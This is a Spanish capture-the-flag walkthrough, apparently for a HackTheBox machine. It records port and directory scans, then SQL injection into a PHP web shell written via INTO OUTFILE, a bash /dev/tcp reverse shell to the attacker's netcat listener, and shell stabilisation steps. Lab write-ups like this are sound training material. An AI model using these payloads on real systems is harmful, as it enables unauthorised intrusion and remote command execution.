- ### Enumeración
	- **Escaneo de puertos:
	``` bash 
			nmap -Pn  10.10.11.116 -sC -sV -oG "puertos"
			Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 17:47 EDT
			Nmap scan report for 10.10.11.116
			Host is up (0.27s latency).
			Not shown: 992 closed tcp ports (reset)
			PORT     STATE    SERVICE       VERSION
			22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
			|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
			|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
			80/tcp   open     http          Apache httpd 2.4.48 ((Debian))
			|_http-server-header: Apache/2.4.48 (Debian)
			|_http-title: Site doesn `t have a title (text/html; charset=UTF-8).
			5000/tcp filtered upnp
			5001/tcp filtered commplex-link
			5002/tcp filtered rfe
			5003/tcp filtered filemaker
			5004/tcp filtered avt-profile-1
			8080/tcp open     http          nginx
			|_http-title: 502 Bad Gateway
			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
			
			Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
			Nmap done: 1 IP address (1 host up) scanned in 34.98 seconds
```
	- **Fuzzing Sobre la pagina web**
	```bash 
		gobuster dir -u http://10.10.11.116/ -w /usr/share/wordlists/dirbuster/directories.jbrofuzz -x php -t50
		===============================================================
		Gobuster v3.6
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
		===============================================================
		[+] Url:                     http://10.10.11.116/
		[+] Method:                  GET
		[+] Threads:                 50
		[+] Wordlist:                /usr/share/wordlists/dirbuster/directories.jbrofuzz
		[+] Negative Status codes:   404
		[+] User Agent:              gobuster/3.6
		[+] Extensions:              php
		[+] Timeout:                 10s
		===============================================================
		Starting gobuster in directory enumeration mode
		===============================================================
		[ERROR] parse "http://10.10.11.116/%": invalid URL escape "%"
		[ERROR] parse "http://10.10.11.116/%.php": invalid URL escape "%.p"
		/??.php               (Status: 200) [Size: 16088]
		/??                   (Status: 200) [Size: 16088]
		/.                    (Status: 200) [Size: 16088]
		/account.php          (Status: 200) [Size: 16]
		/config.php           (Status: 200) [Size: 0]
		/css                  (Status: 301) [Size: 310] [--> http://10.10.11.116/css/]
		/index.php            (Status: 200) [Size: 16088]
		/js                   (Status: 301) [Size: 309] [--> http://10.10.11.116/js/]
		Progress: 117376 / 117378 (100.00%)
		===============================================================
		Finished
		===============================================================
	```
	- **Chequeo de posible inyección SQL
		- ![[Pasted image 20250317214918.png]]
		- ![[Pasted image 20250317215002.png]]
		- ![[Pasted image 20250317215815.png]]
		- ![[Pasted image 20250317215842.png]]
- ### Explotacion

	- **Ejecucion de remota de codigo por inyeccion php**
		- creacion de un archivo pwned que permita ejecutar comando de bash atravez de php:
			```php
			 ' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/pwned.php"-- -
			```
	- peticion:
		![[Pasted image 20250318191453.png]]
	- respuesta:
		![[Pasted image 20250318191554.png]]
	- En la url escribo pwned.php y me lleva al archivo anteriormente creado con la inyeccion
		![[Pasted image 20250318192712.png]]
	- El cual puedo utilizar para ejecutar comandos en el equipo victima
		![[Pasted image 20250318192819.png]]
		![[Pasted image 20250318193034.png]]
	- **Explotación de vulnerabilidad con reverse shell:**
		- Pongo a escuchar con netcat en el puerto 443:
		```bash
		nc -nlvp 443
		```
		- Creacion de reverse shell  :
		```bash
		bash -c 'bash -i>&/dev/tcp/"ip del equipo atacante"/443 0>&1'
		```
		- Utilizando la utilidad de "Decoder " codificamos el reverse shell a URL:
		![[Pasted image 20250318194023.png]]
		- una vez colocado en la url tiene que quedar cargando la pagina
		![[Pasted image 20250318195438.png]]
		- A parte tendrian que aparecer un shell en la terminal donde estaba escuchando con netcat:
		- ![[Pasted image 20250318214206.png]]
		- Flag user.txt :
		 ![[Pasted image 20250318214414.png]]
	 - ### Post-Explotacion:
		 - **Tratamiento de la tti:**
			```bash 
			 - script /dev/null -c bash
			 - hacer ctrl+z para suspender la session
			 - stty raw -echo; fg
			 - reset xterm
			 - export TERM=xterm
			```
		- **encuentro de contraseña root:**
			![[Pasted image 20250318215453.png]]